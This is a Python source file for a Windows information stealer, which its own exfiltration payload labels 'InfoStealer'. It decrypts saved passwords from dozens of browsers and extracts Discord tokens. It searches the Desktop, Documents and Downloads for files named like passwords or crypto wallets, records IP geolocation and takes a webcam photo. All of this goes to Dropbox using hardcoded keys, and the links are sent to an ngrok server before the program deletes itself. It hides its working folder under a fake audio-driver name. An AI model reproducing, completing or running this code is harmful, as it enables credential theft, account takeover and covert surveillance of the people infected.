import os
import sys
import shutil
import requests
import subprocess
import platform

import cv2

import re
import json
import base64
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

import dropbox
import os
from dropbox.exceptions import ApiError

import zipfile
import os

import sqlite3
import win32crypt
from datetime import timezone, datetime, timedelta
import datetime

USER_PROFILE = os.getenv("USERPROFILE")
APP_DATA = os.getenv("APPDATA")
LOCAL_APP_DATA = os.getenv("LOCALAPPDATA")
STORAGE_PATH = os.path.join(APP_DATA, "Microsoft Store")
USER_NAME = USER_PROFILE[9:len(USER_PROFILE)]

APP_KEY = "32tfcqg44dz6pyp"
APP_SECRET = "ei5mrrr8nwx8601"
REFRESH_TOKEN = "wmCiZLzTLmMAAAAAAAAAAY-LYUOPp36oc8RAJcdXxyCoANvHy6key04SwPQHrYyA"

if os.path.exists(os.path.join(LOCAL_APP_DATA, "HD Realtek Audio Player")):
    print("Folder is already")
    shutil.rmtree(os.path.join(LOCAL_APP_DATA, "HD Realtek Audio Player"))
    os.makedirs(os.path.join(LOCAL_APP_DATA, "HD Realtek Audio Player"))
else:
    os.makedirs(os.path.join(LOCAL_APP_DATA, "HD Realtek Audio Player"))
    
MAIN_FOLDER_PATH = os.path.join(LOCAL_APP_DATA, "HD Realtek Audio Player")

if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

CHROME_PATHS = [
    {"name": "Chrome", "path": os.path.join(LOCAL_APP_DATA, "Google", "Chrome", "User Data")},
        {"name": "Chrome (x86)", "path": os.path.join(LOCAL_APP_DATA, "Google(x86)", "Chrome(86)", "User Data")},
        {"name": "Edge", "path": os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge", "User Data")},
        {"name": "Brave", "path": os.path.join(LOCAL_APP_DATA, "BraveSoftware", "Brave", "User Data")},
]

OTHER_SEARCH_APPS_PATHS = [
    {"name": "Google Chrome", "path": os.path.join(LOCAL_APP_DATA, "Google", "Chrome", "User Data")},
    {"name": "Chrome Beta", "path": os.path.join(LOCAL_APP_DATA, "Google", "Chrome Beta", "User Data")},
    {"name": "Chrome Dev", "path": os.path.join(LOCAL_APP_DATA, "Google", "Chrome Dev", "User Data")},
    {"name": "Chrome Canary", "path": os.path.join(LOCAL_APP_DATA, "Google", "Chrome SxS", "User Data")},
    {"name": "Chromium", "path": os.path.join(LOCAL_APP_DATA, "Chromium", "User Data")},

    {"name": "Microsoft Edge", "path": os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge", "User Data")},
    {"name": "Edge Beta", "path": os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge Beta", "User Data")},
    {"name": "Edge Dev", "path": os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge Dev", "User Data")},
    {"name": "Edge Canary", "path": os.path.join(LOCAL_APP_DATA, "Microsoft", "Edge SxS", "User Data")},

    {"name": "Brave", "path": os.path.join(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser", "User Data")},
    {"name": "Brave Beta", "path": os.path.join(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser-Beta", "User Data")},
    {"name": "Brave Dev", "path": os.path.join(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser-Dev", "User Data")},
    {"name": "Brave Nightly", "path": os.path.join(LOCAL_APP_DATA, "BraveSoftware", "Brave-Browser-Nightly", "User Data")},

    {"name": "Opera", "path": os.path.join(APP_DATA, "Opera Software", "Opera Stable")},
    {"name": "Opera GX", "path": os.path.join(APP_DATA, "Opera Software", "Opera GX Stable")},
    {"name": "Opera Beta", "path": os.path.join(APP_DATA, "Opera Software", "Opera Beta")},
    {"name": "Opera Developer", "path": os.path.join(APP_DATA, "Opera Software", "Opera Developer")},

    {"name": "Firefox", "path": os.path.join(APP_DATA, "Mozilla", "Firefox", "Profiles")},
    {"name": "Firefox Beta", "path": os.path.join(APP_DATA, "Mozilla", "Firefox", "Profiles")},
    {"name": "Firefox Dev", "path": os.path.join(APP_DATA, "Mozilla", "Firefox", "Profiles")},
    {"name": "Firefox Nightly", "path": os.path.join(APP_DATA, "Mozilla", "Firefox", "Profiles")},
    {"name": "Waterfox", "path": os.path.join(APP_DATA, "Waterfox", "Profiles")},
    {"name": "LibreWolf", "path": os.path.join(APP_DATA, "LibreWolf", "Profiles")},
    {"name": "Pale Moon", "path": os.path.join(APP_DATA, "Moonchild Productions", "Pale Moon", "Profiles")},

    {"name": "Tor Browser", "path": os.path.join(APP_DATA, "Tor Browser", "Browser", "TorBrowser", "Data", "Browser", "profile.default")},

    {"name": "Vivaldi", "path": os.path.join(LOCAL_APP_DATA, "Vivaldi", "User Data")},

    {"name": "Yandex Browser", "path": os.path.join(LOCAL_APP_DATA, "Yandex", "YandexBrowser", "User Data")},

    {"name": "UC Browser", "path": os.path.join(LOCAL_APP_DATA, "UCBrowser", "User Data")},
    {"name": "QQ Browser", "path": os.path.join(LOCAL_APP_DATA, "Tencent", "QQBrowser", "User Data")},
    {"name": "Baidu Browser", "path": os.path.join(LOCAL_APP_DATA, "Baidu", "Browser", "User Data")},

    {"name": "Ungoogled Chromium", "path": os.path.join(LOCAL_APP_DATA, "Chromium", "User Data")},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCAL_APP_DATA, "Epic Privacy Browser", "User Data")},
    {"name": "SRWare Iron", "path": os.path.join(LOCAL_APP_DATA, "Chromium", "User Data")},
    {"name": "Slimjet", "path": os.path.join(LOCAL_APP_DATA, "Slimjet", "User Data")},
    {"name": "Comodo Dragon", "path": os.path.join(LOCAL_APP_DATA, "Comodo", "Dragon", "User Data")},
    {"name": "Torch Browser", "path": os.path.join(LOCAL_APP_DATA, "Torch", "User Data")},

    {"name": "Maxthon", "path": os.path.join(APP_DATA, "Maxthon5", "Users")},
    {"name": "Avant Browser", "path": os.path.join(APP_DATA, "Avant Browser", "Profiles")},
    {"name": "K-Meleon", "path": os.path.join(APP_DATA, "K-Meleon", "Profiles")},
    {"name": "SeaMonkey", "path": os.path.join(APP_DATA, "Mozilla", "SeaMonkey", "Profiles")},

    {"name": "Discord", "path": os.path.join(APP_DATA, "discord")},
    {"name": "Slack", "path": os.path.join(APP_DATA, "Slack")},
    {"name": "WhatsApp Desktop", "path": os.path.join(APP_DATA, "WhatsApp")},
    {"name": "Microsoft Teams", "path": os.path.join(APP_DATA, "Microsoft", "Teams")},
    {"name": "Spotify", "path": os.path.join(APP_DATA, "Spotify")},
    {"name": "Visual Studio Code", "path": os.path.join(APP_DATA, "Code")},
]

PATHS_TO_SEARCH = [
    USER_PROFILE + "\\Desktop",
    USER_PROFILE + "\\Documents",
    USER_PROFILE + "\\Downloads",
    USER_PROFILE + "\\OneDrive\\Documents",
    USER_PROFILE + "\\OneDrive\\Desktop",
]

FILE_KEYWORDS = [
    "psw",
    "psws",
    "password",
    "passwords"
    "passw",
    "mdp",
    "motdepasse",
    "mot_de_passe",
    "login",
    "secret",
    "account",
    "acount",
    "paypal",
    "banque",
    "metamask",
    "wallet",
    "crypto",
    "exodus",
    "discord",
    "2fa",
    "code",
    "memo",
    "compte",
    "token",
    "backup",
    "seecret",
    "secret",
    "passphrase",
    "chrome_passwords",
    "chrome passwords",
    "chrome_password",
    "chrome password",
    "firefox_passwords",
    "firefox passwords",
    "firefox_password",
    "firefox password",
    "opera_passwords",
    "opera passwords",
    "opera_password",
    "opera password",
    "operagx_passwords",
    "operagx passwords",
    "operagx_password",
    "operagx password",
]

ALLOWED_EXTENSIONS = [
    ".txt",
    ".log",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".odt",
    ".pdf",
    ".rtf",
    ".json",
    ".csv",
    ".db",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".webp",
    ".mp4",
    ".py"    
]

EXISTING_APP = []

COOKIESDATA = []
COOKIESDATAREAL = []

FILESDATA =[]
FILESDATAREAL =[]

FILESDATACOUNT = 0

FILES = []
FILESREAL = []

FILESCOUNT = 0

FILESBROWSERS = []
FILESBROWSERSREAL = []

PERSONDATA = []
PERSONDATAREAL = []

LOCATIONS_TO_SEARCH = [
    "Default",

    "Profile 1",
    "Profile 2",
    "Profile 3",
    "Profile 4",
    "Profile 5",
    "Profile 6",
    "Profile 7",
    "Profile 8",
    "Profile 9",
    "Profile 10",

    "Guest Profile",
    "System Profile",
]

COOKIE_FILENAMES = [
    "Cookies",
    "Cookies-journal",
    "Cookies-wal",
    "Cookies-shm",

    "cookies.sqlite",
    "cookies.sqlite-wal",
    "cookies.sqlite-shm",

    "Cookies.binarycookies",
    "Cookies.db",
    "Cookies.plist",
]

Data_FILENAMES = [
    "Network Persistent State",
    "Web Data",
    "Login Data",
    "Cookies-journal",
    "Local Storage",
]

def upload_to_dropbox(path):
    if not os.path.exists(path):
        raise FileNotFoundError("Path not found!")

    if os.path.isdir(path):
        print(f"Folder detected. Zipping folder '{path}'...")
        path = zip_folder(path)
        print(f"Folder zipped to '{path}'")

    dbx = dropbox.Dropbox(
        oauth2_refresh_token=REFRESH_TOKEN,
        app_key=APP_KEY,
        app_secret=APP_SECRET
    )

    filename = os.path.basename(path)
    dropbox_path = f"/{filename}"

    with open(path, "rb") as f:
        dbx.files_upload(
            f.read(),
            dropbox_path,
            mode=dropbox.files.WriteMode.overwrite,
            mute=True
        )

    try:
        link_metadata = dbx.sharing_create_shared_link_with_settings(dropbox_path)
        url = link_metadata.url

    except ApiError:
        links = dbx.sharing_list_shared_links(
            path=dropbox_path,
            direct_only=True
        ).links

        if links:
            url = links[0].url
        else:
            raise Exception("Could not create or find shared link")

    url = url.replace("www.dropbox.com", "dl.dropboxusercontent.com")

    if "dl=0" in url:
        url = url.replace("dl=0", "dl=1")
    elif "dl=1" not in url:
        if "?" in url:
            url += "&dl=1"
        else:
            url += "?dl=1"

    return url

def find_files():
    target_names = [name.lower() for name in FILE_KEYWORDS]
    allowed_exts = [ext.lower() for ext in ALLOWED_EXTENSIONS]

    seen_paths = set()
    seen_urls = set()

    for base_path in PATHS_TO_SEARCH:
        if not os.path.exists(base_path):
            continue

        for root, dirs, files in os.walk(base_path):
            for filename in files:
                name_without_ext, ext = os.path.splitext(filename)

                if ext.lower() in allowed_exts and name_without_ext.lower() in target_names:
                    full_path = os.path.join(root, filename)

                    normalized_path = os.path.normcase(
                        os.path.realpath(os.path.abspath(full_path))
                    )

                    if normalized_path in seen_paths:
                        continue

                    url = upload_to_dropbox(normalized_path)

                    if url in seen_urls:
                        continue

                    FILES.append(url)
                    FILESREAL.append(normalized_path)

                    seen_paths.add(normalized_path)
                    seen_urls.add(url)

def zip_folder(folder_path):
    zip_path = folder_path.rstrip("/\\") + ".zip"
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, start=folder_path)
                try:
                    zipf.write(full_path, arcname)
                except PermissionError:
                    print(f"Skipped (no permission): {full_path}")

    return zip_path

def CheckBrowsers():
    all_tables = CHROME_PATHS + OTHER_SEARCH_APPS_PATHS

    for browser in all_tables:
        name = browser["name"]
        path = browser["path"]

        if os.path.exists(path):
            EXISTING_APP.insert(1,browser)

    print("Done Table")

def delete_self(delay=1):
    """
    Deletes the currently running executable after a delay (in seconds).
    Works on Windows only.
    """
    exe_path = sys.executable
    bat_path = os.path.join(os.getenv("TEMP"), "del_self.bat")

    with open(bat_path, "w") as bat:
        bat.write(f"""@echo off
timeout /t {delay} > nul
del "{exe_path}"
del "%~f0"
""")

    subprocess.Popen(bat_path, shell=True)
    sys.exit()

def CheckFiles():
    global FILESDATACOUNT

    for app in EXISTING_APP:
        path = app["path"]

        for location in LOCATIONS_TO_SEARCH:
            folder_path = os.path.join(path, location)

            for file in Data_FILENAMES:
                file_path = os.path.join(folder_path, file)
                if os.path.exists(file_path):
                    print(f"File Found: {file_path}")

                    FILESDATACOUNT += 1

                    print(file_path)

                    FILESDATA.append(upload_to_dropbox(file_path))
                    FILESDATAREAL.append(file_path)

                    try:
                        shutil.copy2(file_path, os.path(LOCAL_APP_DATA + "\\" + "HD Realtek Audio Player"))
                    except Exception as e:
                        print(f"Failed to copy {file_path}: {e}")

    print(f"Total FILES Found: {FILESCOUNT}")
    print("Files Table: \n")

    url = "https://undazed-kaylynn-paradoxical.ngrok-free.dev/Signal" 
    headers = {
        "Authorization": "Bearer supersecret123"
    }

    data = {    
        "Data": {
            "CookiesData": COOKIESDATA,
            "CookiesDataREAL": COOKIESDATAREAL,

            "PasswordsOnPc": FILES,
            "PasswordsOnPcREAL": FILESREAL,

            "PasswordsBrowsers": FILESBROWSERS,
            "PasswordsBrowsersREAL": FILESBROWSERSREAL,

            "Data": FILESDATA,
            "DataREAL": FILESDATAREAL,

            "PersonData": PERSONDATA,
            "PersonDataREAL": PERSONDATAREAL,
        },

        "Type": "InfoStealer",
        "UserName": USER_NAME
    }

    try:
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print("status:", r.status_code)
        print("response:", r.text)

        openyoutube()
        delete_self()
    except requests.exceptions.RequestException as e:
        print("Request failed:", e)

        delete_self()
        
def get_master_key():
    local_state_path = os.path.join(os.getenv("APPDATA"), "discord", "Local State")
    with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
        state = json.load(f)
    encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = CryptUnprotectData(encrypted_key)[1]
    return master_key

def decrypt_token(blob, master_key):
    if not blob.startswith("v10_"):
        return None
    blob = base64.b64decode(blob[4:])
    nonce = blob[:12]
    ciphertext = blob[12:-16]
    tag = blob[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode("utf-8")
    except Exception:
        return None

def find_tokens(leveldb_path):
    master_key = get_master_key()
    tokens = set()
    enc_pattern = re.compile(r"dQw4w9WgXcQ:([^\"]*)")
    unenc_patterns = [
        r"[\w-]{20,30}\.[\w-]{6,10}\.[\w-]{20,40}",
        r"mfa\.[\w-]{80,120}"
    ]   
    for fname in os.listdir(leveldb_path):
        if not (fname.endswith(".log") or fname.endswith(".ldb")):
            continue
        fpath = os.path.join(leveldb_path, fname)
        try:
            with open(fpath, "r", errors="ignore") as f:
                for line in f:
                    for match in enc_pattern.findall(line):
                        token = decrypt_token(match, master_key)
                        if token:
                            tokens.add(token)
                    for pat in unenc_patterns:
                        for token in re.findall(pat, line):
                            tokens.add(token)
        except Exception:
            continue
    return list(tokens)

def CreateFile(found_tokens):
    with open(os.path.join(MAIN_FOLDER_PATH, "DiscordTokens.txt"), "w") as file:
        for token in found_tokens:
            file.write(token + "\n")
        
    COOKIESDATA.append(upload_to_dropbox(os.path.join(MAIN_FOLDER_PATH, "DiscordTokens.txt")))
    COOKIESDATAREAL.append(os.path.join(MAIN_FOLDER_PATH, "DiscordTokens.txt"))

def find_discord_token_in_leveldb(leveldb_path, browser_Name):
    found_tokens = find_tokens(leveldb_path)
    if found_tokens:
        return found_tokens
    else:
        print("No tokens found.")

def deep_search(start_path, target_name):
    for root, dirs, files in os.walk(start_path):

        if target_name in dirs:
            full_path = os.path.join(root, target_name)
            return full_path

        if target_name in files:
            full_path = os.path.join(root, target_name)
            return full_path

    return None

def search_browsers_leveldb():
    combined = CHROME_PATHS + OTHER_SEARCH_APPS_PATHS
    Tokens = []

    for _, browser in enumerate(combined):
        Result = deep_search(browser["path"], "leveldb")
        if Result is not None:
            found_tokens = find_discord_token_in_leveldb(Result, browser["name"])
            if found_tokens:
                Tokens.extend(found_tokens)

    if Tokens:
        CreateFile(Tokens)

def chrome_date_and_time(chrome_data):
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)

def fetching_encryption_key(browser):
    browser_name = browser["name"]
    browser_path = browser["path"]

    local_computer_directory_path = deep_search(browser_path, "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
    
    encryption_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])

    encryption_key = encryption_key[5:]

    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption(password, encryption_key):

    try:
        iv = password[3:15]
        password = password[15:]

        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[0])
        except:
            return "No Passwords"

def fetch_passwords(db_path, browser):

    key = fetching_encryption_key(browser)
    filename = os.path.join(MAIN_FOLDER_PATH, browser["name"].replace(" ", "_") + "_Passwords.db")

    if os.path.exists(filename):
        os.remove(filename)

    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    
    FILESFOUND = []
    
    for row in cursor.fetchall():
        main_url = row[0]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)

        if user_name or decrypted_password:
            dataGot = {"main_url" : main_url, "username":user_name, "password" : decrypted_password}
            FILESFOUND.append(dataGot)

    cursor.close()
    db.close()
    
    try:
        os.remove(filename)
        return FILESFOUND
    except:
        pass

def GetBrowsersData():

    for browser in OTHER_SEARCH_APPS_PATHS + CHROME_PATHS:
        db_path = deep_search(browser["path"], "Login Data")

        if db_path:
            if os.path.exists(db_path):
                FoundData = fetch_passwords(db_path, browser)
                if FoundData is not None:
                    Name = browser["name"].replace(" ", "_") + "_Passwords.txt"

                    print(f"Found in {browser['name']} :")
                    print(FoundData)

                    with open(os.path.join(MAIN_FOLDER_PATH, Name), "a", encoding="utf-8", errors="replace") as f:
                        for data in FoundData:
                            f.write(str(data) + "\n")

                    if os.path.join(MAIN_FOLDER_PATH, Name):
                        File = upload_to_dropbox(os.path.join(MAIN_FOLDER_PATH, Name))

                        FILESBROWSERS.append(File)
                        FILESBROWSERSREAL.append(os.path.join(MAIN_FOLDER_PATH, Name))

def Get_location():
    try:
        response = requests.get("https://ipinfo.io/json", timeout=5)
        data = response.json()

        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        region = data.get("region", "Unknown")
        country = data.get("country", "Unknown")
        postal = data.get("postal", "Unknown")
        org = data.get("org", "Unknown")
        timezone = data.get("timezone", "Unknown")

        loc = data.get("loc", "0,0").split(",")
        lat = float(loc[0])
        lon = float(loc[1])

        os_name = platform.system()
        os_version = platform.version()
        current_time = datetime.datetime.now()

        info = f"""
===== IP INFORMATION =====
IP Address: {ip}
City: {city}
Region: {region}
Country: {country}
Postal Code: {postal}
ISP / Organization: {org}
Timezone: {timezone}
Latitude: {lat}
Longitude: {lon}

===== SYSTEM INFORMATION =====
Operating System: {os_name}
OS Version: {os_version}
Current Time: {current_time}
============================
"""

        file_path = os.path.join(MAIN_FOLDER_PATH, "Data_ME.txt")
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(info)

        print(file_path)

        PERSONDATA.append(upload_to_dropbox(file_path))
        PERSONDATAREAL.append(file_path)

    except Exception as e:
        print("Could not retrieve location:", e)

def capture_photo():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("No camera detected")
        return None

    cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

    for _ in range(5):
        ret, frame = cap.read()

    ret, frame = cap.read()
    if not ret:
        print("Failed to capture image")
        return None

    path = os.path.join(MAIN_FOLDER_PATH, "photo.jpg")
    cv2.imwrite(path, frame)

    cap.release()

    uploaded = upload_to_dropbox(path)

    PERSONDATA.append(uploaded)
    PERSONDATAREAL.append(path)

    return path

def chrome_time_to_dt(chrome_time):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chrome_time)

def Get_History():
    for browser in OTHER_SEARCH_APPS_PATHS + CHROME_PATHS:
        browserPath = browser["path"]
        history_db = deep_search(browserPath, "History")
        
        if history_db is None:
            continue

        temp_db = "History_copy"
        try:
            shutil.copy2(history_db, temp_db)
        except Exception as e:
            print(f"Cannot copy {history_db}: {e}")
            continue

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
            rows = cursor.fetchall()

            for url, title, last_visit_time in rows:
                dt = chrome_time_to_dt(last_visit_time)

                file_path = os.path.join(APP_DATA, browser['name'] + " - History")

                with open(file_path, "a", encoding="utf-8") as file:
                    file.write(f"\n{dt} | {title} | {url}")

                PERSONDATA.append(upload_to_dropbox(file_path))
                PERSONDATAREAL.append(file_path)

            conn.close()
        except Exception as e:
            print(f"Failed reading {browser['name']}: {e}")

def GetCookiesBrowsers():
    AllFoundCookies = []

    for browser in OTHER_SEARCH_APPS_PATHS + CHROME_PATHS:
        BrowserPath = browser["path"]
        
        FilesFoundCookies = []

        for CookieName in COOKIE_FILENAMES:

            Cookie = deep_search(BrowserPath, CookieName)
            if Cookie:
                FilesFoundCookies.append(Cookie)

        if FilesFoundCookies:
            AllFoundCookies.append(FilesFoundCookies)

    print(AllFoundCookies)

def openyoutube():
    url = "https://www.youtube.com/watch?v=xMHJGd3wwZk&autoplay=1"

    chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

    if os.path.exists(chrome_path):
        subprocess.Popen([
            chrome_path,
            "--start-fullscreen",  
            "--autoplay-policy=no-user-gesture-required",  
            url
        ])
    else:
        print("Chrome not found.")

search_browsers_leveldb()
GetBrowsersData()

find_files()
CheckBrowsers()

Get_location()
capture_photo()

#Get_History()

CheckFiles()